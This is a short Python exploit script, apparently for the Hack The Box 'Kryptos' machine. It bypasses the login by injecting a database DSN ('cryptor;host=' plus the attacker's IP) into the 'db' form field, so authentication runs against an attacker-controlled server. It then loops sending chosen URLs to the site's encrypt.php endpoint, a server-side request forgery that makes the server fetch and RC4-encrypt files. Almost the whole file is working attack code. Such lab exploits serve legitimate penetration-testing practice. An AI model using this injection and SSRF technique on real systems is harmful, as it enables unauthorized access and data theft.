# kryptos_encrypt.py
import requests as r

target = "http://10.10.10.129"
htb_ipv4 = "10.10.12.248"
session = r.Session()

def clearScreen(clear="clear"):
    __import__("os").system(clear)

def encodeURL(parameter_value):
    return __import__("urllib").parse.quote(parameter_value)

def encryptRC4(file_url):
    parameters = (("cipher", "RC4"), ("url", file_url))
    return session.get(target+"/encrypt.php", params=parameters)

def extractText(regex_filter, text):
    return __import__("re").findall(regex_filter, text)[0]

data = {
    "username": "placeholder",
    "password": "placeholder",
    "db": "cryptor;host="+htb_ipv4,
    "token": session.get(target).text[737:801],
    "login": ""
}
req_post = session.post(target, data=data)

while True:
    clearScreen()

    file_in = input("Enter the URL of the file to be encrypted: ")
    if(file_in==""): exit()
    
    req_encryption = encryptRC4(file_in)
    rc4_base64 = extractText('<text.*id="output">(.*)</text', req_encryption.text)
    if(rc4_base64): print("\n[Encrypted RC4]\n\n" + rc4_base64 + "\n")
    else:
        print("\n[ERROR]\n")
        print(extractText('alert-danger">\n(.*)</div>', req_encryption.text) + "\n")

    input("--Press Enter to continue--")
